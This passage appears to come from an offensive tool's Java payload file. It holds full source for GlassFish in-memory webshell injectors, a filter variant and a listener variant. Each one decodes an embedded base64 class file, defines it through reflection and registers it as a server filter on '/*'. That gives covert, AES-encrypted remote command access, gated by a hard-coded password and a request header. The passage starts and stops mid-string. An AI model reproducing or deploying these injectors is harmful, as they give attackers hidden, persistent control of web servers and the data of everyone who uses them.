oAAAAJALYAtwACAGQAAAFVAAYABQAAAIQBTBJUuAAsTSwSVQHAADS2AC4sAcAAELYAD04ttgAJElYEvQALWQMSJVO2AC4tBL0ADlkDKlO2AA/AAFHAAFHAAFFMpwA/ThJXuAAsTSy2AE46BBkEtgAJElgEvQALWQMSJVO2AC4ZBAS9AA5ZAypTtgAPwABRwABRwABRTKcABToEK7AAAgACAEMARgAIAEcAfQCAAAgAAwBlAAAAMgAMAAAA5wACAOsACADsABsA7QBDAPUARgDuAEcA8ABNAPEAUwDyAH0A9ACAAPMAggD3AGYAAABIAAcAGwAoALgAXQADAAgAPgC5AJQAAgBTACoAuABdAAQATQAzALkAlAACAEcAOwB3AIYAAwAAAIQAugBhAAAAAgCCALsAtQABAGkAAAApAAP/AEYAAgcApgcAUQABBwBr/wA5AAQHAKYHAFEABwBrAAEHAGv5AAEAlwAAAAQAAQAIAAgAvABjAAEAZAAAAC4AAgAAAAAADhJZswASuwBaWbcAW1exAAAAAQBlAAAADgADAAAADwAFAPsADQD8AAEAvQAAAAIAvg==\";\n" +
            "        byte[] bytes = base64Decode(byteString);\n" +
            "        Class clazz = (Class) super.defineClass(bytes, 0, bytes.length).newInstance();\n" +
            "    }\n" +
            "\n" +
            "}\n";

    public static final String GlassFishFilterMemShell =
                "import java.lang.reflect.Constructor;\n" +
                "import java.lang.reflect.Field;\n" +
                "import java.lang.reflect.Method;\n" +
                "import java.util.HashMap;\n" +
                "import java.util.List;\n" +
                "\n" +
                "public class GlassFishFilterMemShell {\n" +
                "\n" +
                "    static {\n" +
                "        Inject();\n" +
                "    }\n" +
                "\n" +
                "    public GlassFishFilterMemShell() {\n" +
                "        Inject();\n" +
                "    }\n" +
                "\n" +
                "    public static synchronized void Inject() {\n" +
                "        String filterName = \"memshell.GlassFilterShell\";\n" +
                "        String urlPattern = \"/*\";\n" +
                "        try {\n" +
                "            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();\n" +
                "            String ListenerBase64 = \"yv66vgAAADMBRgoAWgCrCQBFAKwJAEUArQgArgkARQCvCACwCQBFALEIALIJAEUAswcAtAoACgCrCgAKALUKAAoAtgoARQC3CQBFALgIALkJAEUAugoAWgC7CgBaALwIAL0KAL4AvwcAwAoAMQDBCgAWAMIKAL4AwwoAvgDEBwDFCADGCgDHAMgKADEAyQoAxwDKBwDLCgDHAMwKACAAzQoAIADOCgAxAM8IANAKAC4A0QgA0gcA0woALgDUBwDVCgDWANcKADAA2AgA2QcA2gcAcwcA2wcA3AgA3QoALgDeCADfCADgCADhCADiCADjBwDkBwDlCADmCwA5AOcIAOgKADEA6QsAOQDqCwA5AOsKAEUA7AoARQDtCADuCwDvAPAHAPEKAC4A8goARQC7CgBFAPMLAO8A9AgA9QsAOQD0BwD2CgBMAKsKADAA9wsAOgD4CgAxAPkKAPoA+woAMAC2CgBMAPwKAEUA/QoAMQD+CAD/CAEACwEBAQIKABsBAwcBBAcBBQEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAJ4YwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAA1B3ZAEABHBhdGgBAANtZDUBAAJjcwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAbTG1lbXNoZWxsL0dsYXNzRmlsdGVyU2hlbGw7AQAaKExqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KVYBAAF6AQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAFRAQAVKFtCKUxqYXZhL2xhbmcvQ2xhc3M7AQACY2IBAAJbQgEAAXgBAAcoW0JaKVtCAQABYwEAFUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEABHZhcjQBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAFzAQABbQEAAVoBAA1TdGFja01hcFRhYmxlBwDxBwEGBwDFAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAB1MamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEAA3JldAcA3AEADGJhc2U2NEVuY29kZQEAFihbQilMamF2YS9sYW5nL1N0cmluZzsBAAdFbmNvZGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAGYmFzZTY0AQARTGphdmEvbGFuZy9DbGFzczsBAAR2YXI2AQACYnMBAAV2YWx1ZQEACkV4Y2VwdGlvbnMBAAxiYXNlNjREZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAHZGVjb2RlcgEABGluaXQBAB8oTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOylWAQAMZmlsdGVyQ29uZmlnAQAcTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOwcBBwEACGRvRmlsdGVyAQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgEABmFyck91dAEAH0xqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAFmAQAHc2Vzc2lvbgEAIExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAEZGF0YQEABHZhcjkBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAtmaWx0ZXJDaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwcBCAcBCQEAB2Rlc3Ryb3kBAApTb3VyY2VGaWxlAQAVR2xhc3NGaWx0ZXJTaGVsbC5qYXZhDABmAGcMAFwAXQwAXgBfAQAQM2M2ZTBiOGE5YzE1MjI0YQwAYABhAQAEcEFTMwwAYgBhAQAQL2Zhdmljb25kZW1vLmljbwwAYwBhAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAQoBCwwBDAENDABkAIEMAGQAYQEABVVURi04DABlAGEMAGYAbQwBDgEPAQADQUVTBwEGDAEQAREBAB9qYXZheC9jcnlwdG8vc3BlYy9TZWNyZXRLZXlTcGVjDAESARMMAGYBFAwAkgEVDAEWARcBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQADTUQ1BwEYDAEQARkMARoBGwwBHAEdAQAUamF2YS9tYXRoL0JpZ0ludGVnZXIMAR4BEwwAZgEfDAEMASAMASEBDQEAEGphdmEudXRpbC5CYXNlNjQMASIBIwEACmdldEVuY29kZXIBABJbTGphdmEvbGFuZy9DbGFzczsMASQBJQEAE1tMamF2YS9sYW5nL09iamVjdDsHASYMAScBKAwBKQEqAQAOZW5jb2RlVG9TdHJpbmcBAA9qYXZhL2xhbmcvQ2xhc3MBABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N0cmluZwEAFnN1bi5taXNjLkJBU0U2NEVuY29kZXIMASsBLAEABmVuY29kZQEACmdldERlY29kZXIBAAZkZWNvZGUBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyAQAMZGVjb2RlQnVmZmVyAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAQWC1SZXF1ZXN0ZWQtV2l0aAwBLQCBAQAOWE1MSFRUUFJlcXVlc3QMAS4BLwwBMAExDAEyAIEMAI8AkAwAdAB1AQAQbWVtc2hlbGwucGF5bG9hZAcBCAwBMwE0AQAZbWVtc2hlbGwvR2xhc3NGaWx0ZXJTaGVsbAwBNQE2DABwAHEMATcBOAEACnBhcmFtZXRlcnMBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQwBOQE6DAE7ATwMAT0BPgcBPwwBQAFBDAFCARMMAIUAhgwBPQEgAQAOWG1sSFRUUFJlcXVlc3QBAAdTdWNjZXNzBwFDDACXAUQMAUUAZwEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAFGphdmF4L3NlcnZsZXQvRmlsdGVyAQATamF2YXgvY3J5cHRvL0NpcGhlcgEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQALZGVmaW5lQ2xhc3MBABcoW0JJSSlMamF2YS9sYW5nL0NsYXNzOwEAC2dldEluc3RhbmNlAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEAFyhJTGphdmEvc2VjdXJpdHkvS2V5OylWAQAHZG9GaW5hbAEABihbQilbQgEAG2phdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdAEAMShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBAAZsZW5ndGgBAAMoKUkBAAZ1cGRhdGUBAAcoW0JJSSlWAQAGZGlnZXN0AQAGKElbQilWAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7AQALdG9VcHBlckNhc2UBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQAJZ2V0SGVhZGVyAQAHaW5kZXhPZgEAFShMamF2YS9sYW5nL1N0cmluZzspSQEACmdldFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAMZ2V0UGFyYW1ldGVyAQAMZ2V0QXR0cmlidXRlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsB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\";\n" +
                "            byte[] FilterClass = base64Decode(ListenerBase64);\n" +
                "\n" +
                "            Method defineClass1 = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class);\n" +
                "            defineClass1.setAccessible(true);\n" +
                "            Class filterClass = (Class) defineClass1.invoke(classLoader, FilterClass, 0, FilterClass.length);\n" +
                "\n" +
                "            Object filterObject = (Object) filterClass.newInstance();\n" +
                "\n" +
                "            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();\n" +
                "            Field f1 = threadGroup.getClass().getDeclaredField(\"threads\");\n" +
                "            f1.setAccessible(true);\n" +
                "            Thread[] threads = (Thread[]) f1.get(threadGroup);\n" +
                "\n" +
                "            for (Thread thread : threads) {\n" +
                "                try {\n" +
                "                    char[] charArray = (char[]) getFV(thread, \"name\");\n" +
                "                    String chars = String.valueOf(charArray);\n" +
                "\n" +
                "                    if (chars.contains(\"ContainerBackgroundProcessor\") && chars.matches(\".*StandardContext\\\\[/.+\\\\]\")) {\n" +
                "                        Object target = getFV(thread, \"target\");\n" +
                "                        Object this0 = getFV(target, \"this$0\");\n" +
                "\n" +
                "                        Method mf = this0.getClass().getSuperclass().getSuperclass().getDeclaredMethod(\"findFilterConfig\", String.class);\n" +
                "                        mf.setAccessible(true);\n" +
                "                        if (mf.invoke(this0, filterName) == null) {\n" +
                "                            Constructor<?>[] consFilterDef = Class.forName(\"org.apache.catalina.deploy.FilterDef\").getDeclaredConstructors();\n" +
                "                            consFilterDef[0].setAccessible(true);\n" +
                "                            Object filterDef = consFilterDef[0].newInstance();\n" +
                "                            Method m2 = filterDef.getClass().getDeclaredMethod(\"setFilterName\", String.class);\n" +
                "                            m2.setAccessible(true);\n" +
                "                            m2.invoke(filterDef, filterName);\n" +
                "                            Method m3 = filterDef.getClass().getDeclaredMethod(\"setFilter\", filterObject.getClass());\n" +
                "                            m3.setAccessible(true);\n" +
                "                            m3.invoke(filterDef, filterObject);\n" +
                "                            Constructor<?>[] consFilterConfig = Class.forName(\"org.apache.catalina.core.ApplicationFilterConfig\").getDeclaredConstructors();\n" +
                "                            consFilterConfig[0].setAccessible(true);\n" +
                "                            Object config = consFilterConfig[0].newInstance(this0, filterDef);\n" +
                "\n" +
                "                            Constructor<?>[] consFilterMap = Class.forName(\"org.apache.catalina.deploy.FilterMap\").getDeclaredConstructors();\n" +
                "                            consFilterMap[0].setAccessible(true);\n" +
                "                            Object filterMap = consFilterMap[0].newInstance();\n" +
                "                            Method m4 = filterMap.getClass().getDeclaredMethod(\"setFilterName\", String.class);\n" +
                "                            m4.setAccessible(true);\n" +
                "                            m4.invoke(filterMap, filterName);\n" +
                "                            Method m5 = filterMap.getClass().getDeclaredMethod(\"setURLPattern\", String.class);\n" +
                "                            m5.setAccessible(true);\n" +
                "                            m5.invoke(filterMap, urlPattern);\n" +
                "                            HashMap<String, Object> filterConfigs = (HashMap<String, Object>) getFV(this0, \"filterConfigs\");\n" +
                "                            filterConfigs.put(filterName, config);\n" +
                "                            List object = (List) getFV(this0, \"filterMaps\");\n" +
                "                            object.add(filterMap);\n" +
                "                        }\n" +
                "\n" +
                "                    }\n" +
                "                } catch (Exception e) {\n" +
                "                    System.out.println(e);\n" +
                "                }\n" +
                "            }\n" +
                "        } catch (Exception e) {\n" +
                "        }\n" +
                "\n" +
                "    }\n" +
                "\n" +
                "    private static synchronized Object getFV(Object var0, String var1) throws Exception {\n" +
                "        Field var2 = null;\n" +
                "        Class var3 = var0.getClass();\n" +
                "\n" +
                "        while (var3 != Object.class) {\n" +
                "            try {\n" +
                "                var2 = var3.getDeclaredField(var1);\n" +
                "                break;\n" +
                "            } catch (NoSuchFieldException var5) {\n" +
                "                var3 = var3.getSuperclass();\n" +
                "            }\n" +
                "        }\n" +
                "\n" +
                "        if (var2 == null) {\n" +
                "            throw new NoSuchFieldException(var1);\n" +
                "        } else {\n" +
                "            var2.setAccessible(true);\n" +
                "            return var2.get(var0);\n" +
                "        }\n" +
                "    }\n" +
                "\n" +
                "    public static byte[] base64Decode(String bs) throws Exception {\n" +
                "        byte[] value = null;\n" +
                "\n" +
                "        Class base64;\n" +
                "        try {\n" +
                "            base64 = Class.forName(\"java.util.Base64\");\n" +
                "            Object decoder = base64.getMethod(\"getDecoder\", (Class[]) null).invoke(base64, (Object[]) null);\n" +
                "            value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, bs));\n" +
                "        } catch (Exception var6) {\n" +
                "            try {\n" +
                "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
                "                Object decoder = base64.newInstance();\n" +
                "                value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decodeBuffer\", String.class).invoke(decoder, bs));\n" +
                "            } catch (Exception var5) {\n" +
                "            }\n" +
                "        }\n" +
                "\n" +
                "        return value;\n" +
                "    }\n" +
                "}\n";

    public static final String GlassFishListenerMemShell =
                    "import java.lang.reflect.Field;\n" +
                    "import java.lang.reflect.Method;\n" +
                    "import java.util.EventListener;\n" +
                    "import java.util.List;\n" +
                    "\n" +
                    "public class GlassFishListenerMemShell {\n" +
                    "    static {\n" +
                    "        Inject();\n" +
                    "    }\n" +
                    "\n" +
                    "    public GlassFishListenerMemShell() {\n" +
                    "        Inject();\n" +
                    "    }\n" +
                    "\n" +
                    "    public static synchronized void Inject() {\n" +
                    "        try {\n" +
                    "            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();\n" +
                    "            String ListenerBase64 = \"yv66vgAAADMBaAoAYwC9CQBMAL4JAEwAvwgAwAkATADBCADCCQBMAMMIAMQJAEwAxQcAxgoACgC9CgAKAMcKAAoAyAoATADJCQBMAMoIAMsJAEwAzAoAYwDNCgBjAM4IAM8KANAA0QcA0goAMQDTCgAWANQKANAA1QoA0ADWBwDXCADYCgDZANoKADEA2woA2QDcBwDdCgDZAN4KACAA3woAIADgCgAxAOEIAOIKAC4A4wgA5AcA5QoALgDmBwDnCgDoAOkKADAA6ggA6wcA7AcAfAcA7QcA7ggA7woALgDwCADxCADyCADzCAD0CAD1CgAuAPYHAPcKAC4A+AoAOgD5CgD6APsKAPoA/AoA/QD+BwD/CgBMAQAIAQELAEABAggBAwoAMQEECwBAAQULAEABBgoATAEHCgBMAQgIAQkLAQoBCwcBDAoALgENCgBMAM0KAEwBDgsBCgEPCAEQCwBAAQ8HAREKAFMAvQoAMAESCwBhARMKADEBFAoBFQEWCgAwAMgKAFMBFwoATAEYCgAxARkIARoIARsKABsBHAgAZwcBHQgAZQcBHgcBHwEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAJ4YwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAA1B3ZAEABHBhdGgBAANtZDUBAAJjcwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAdTG1lbXNoZWxsL0dsYXNzTGlzdGVuZXJTaGVsbDsBABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEAAXoBABdMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAAVEBABUoW0IpTGphdmEvbGFuZy9DbGFzczsBAAJjYgEAAltCAQABeAEAByhbQlopW0IBAAFjAQAVTGphdmF4L2NyeXB0by9DaXBoZXI7AQAEdmFyNAEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAAXMBAAFtAQABWgEADVN0YWNrTWFwVGFibGUHAQwHASAHANcBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAHUxqYXZhL3NlY3VyaXR5L01lc3NhZ2VEaWdlc3Q7AQADcmV0BwDuAQAMYmFzZTY0RW5jb2RlAQAWKFtCKUxqYXZhL2xhbmcvU3RyaW5nOwEAB0VuY29kZXIBABJMamF2YS9sYW5nL09iamVjdDsBAAZiYXNlNjQBABFMamF2YS9sYW5nL0NsYXNzOwEABHZhcjYBAAJicwEABXZhbHVlAQAKRXhjZXB0aW9ucwEADGJhc2U2NERlY29kZQEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBAAdkZWNvZGVyAQAFZ2V0RlYBADgoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvT2JqZWN0OwEABHZhcjUBACBMamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uOwEAAW8BAAFmAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEABWNsYXp6BwEhBwDsBwD3AQAQcmVxdWVzdERlc3Ryb3llZAEAJihMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50OylWAQADcmVxAQAjTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RFdmVudDsBABJyZXF1ZXN0SW5pdGlhbGl6ZWQBAAZhcnJPdXQBAB9MamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW07AQAHc2Vzc2lvbgEAIExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAEZGF0YQEABHZhcjkHASIHAP8HAR0HASMBABZnZXRSZXNwb25zZUZyb21SZXF1ZXN0AQBRKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OylMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAEdmFyMwEABHZhcjgBAAR2YXIxAQAEdmFyMgEAClNvdXJjZUZpbGUBABdHbGFzc0xpc3RlbmVyU2hlbGwuamF2YQwAbwBwDABlAGYMAGcAaAEAEDNjNmUwYjhhOWMxNTIyNGEMAGkAagEABHBBUzMMAGsAagEAEC9mYXZpY29uZGVtby5pY28MAGwAagEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDAEkASUMASYBJwwAbQCKDABtAGoBAAVVVEYtOAwAbgBqDABvAHYMASgBKQEAA0FFUwcBIAwBKgErAQAfamF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwwBLAEtDABvAS4MAS8BMAwBMQEyAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAA01ENQcBMwwBKgE0DAE1ATYMATcBOAEAFGphdmEvbWF0aC9CaWdJbnRlZ2VyDAE5AS0MAG8BOgwBJgE7DAE8AScBABBqYXZhLnV0aWwuQmFzZTY0DAE9AT4BAApnZXRFbmNvZGVyAQASW0xqYXZhL2xhbmcvQ2xhc3M7DAE/AUABABNbTGphdmEvbGFuZy9PYmplY3Q7BwFBDAFCAUMMAUQBRQEADmVuY29kZVRvU3RyaW5nAQAPamF2YS9sYW5nL0NsYXNzAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBABZzdW4ubWlzYy5CQVNFNjRFbmNvZGVyDAFGAUcBAAZlbmNvZGUBAApnZXREZWNvZGVyAQAGZGVjb2RlAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgEADGRlY29kZUJ1ZmZlcgwBSAFJAQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uDAFKAUUMAG8BSwcBIQwBTAFNDAFOAU8HASIMAVABUQEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QMALUAtgEAEFgtUmVxdWVzdGVkLVdpdGgMAVIAigEADlhNTEhUVFBSZXF1ZXN0DAFTAVQMAVUBVgwBVwCKDACYAJkMAH0AfgEAEG1lbXNoZWxsLnBheWxvYWQHASMMAVgBWQEAG21lbXNoZWxsL0dsYXNzTGlzdGVuZXJTaGVsbAwBWgFbDAB5AHoMAVwBXQEACnBhcmFtZ